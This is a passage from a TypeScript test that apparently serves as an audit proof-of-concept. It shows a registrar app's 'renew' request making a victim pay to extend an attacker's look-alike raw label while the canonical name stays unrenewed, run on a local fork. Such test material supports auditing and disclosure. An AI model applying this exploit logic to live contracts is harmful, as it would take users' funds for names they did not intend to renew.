      abi: ethRegistrarRenewSnippet,
      data: harness.request!.data,
    })
    expect(decoded.functionName).toBe('renew')
    expect(decoded.args[0]).toBe(contractRawLabel)
    expect(decoded.args[0]).not.toBe(contractCanonicalLabel)

    // This submits the exact request produced by the audited app actor only to
    // the disposable local fork.
    await send(victim, harness.request!.to, harness.request!.data)

    const victimBalanceAfter = await publicClient.readContract({
      address: paymentToken,
      abi: erc20Abi,
      functionName: 'balanceOf',
      args: [victim.address],
    })
    const canonicalAfter = await expiryOf(contractCanonicalLabel)
    const rawAfter = await expiryOf(contractRawLabel)

    expect(victimBalanceAfter).toBeLessThan(victimBalanceBefore)
    expect(canonicalAfter).toBe(canonicalBefore)
    expect(rawAfter).toBe(rawBefore + harness.renewalDuration)

    console.log(
      JSON.stringify(
        {
          rawLabel: contractRawLabel,
          canonicalLabel: contractCanonicalLabel,
          rawLabelCodePoints: codePoints(contractRawLabel),
          canonicalLabelCodePoints: codePoints(contractCanonicalLabel),
          rawLabelhash: labelhash(contractRawLabel),
          canonicalLabelhash: labelhash(contractCanonicalLabel),
          encodedRenewLabel: decoded.args[0],
          victimPaid: (victimBalanceBefore - victimBalanceAfter).toString(),
          canonicalExpiryDelta: (canonicalAfter - canonicalBefore).toString(),
          attackerRawExpiryDelta: (rawAfter - rawBefore).toString(),
        },
        null,
        2,
      ),
    )
  }, 120_000)
})

```
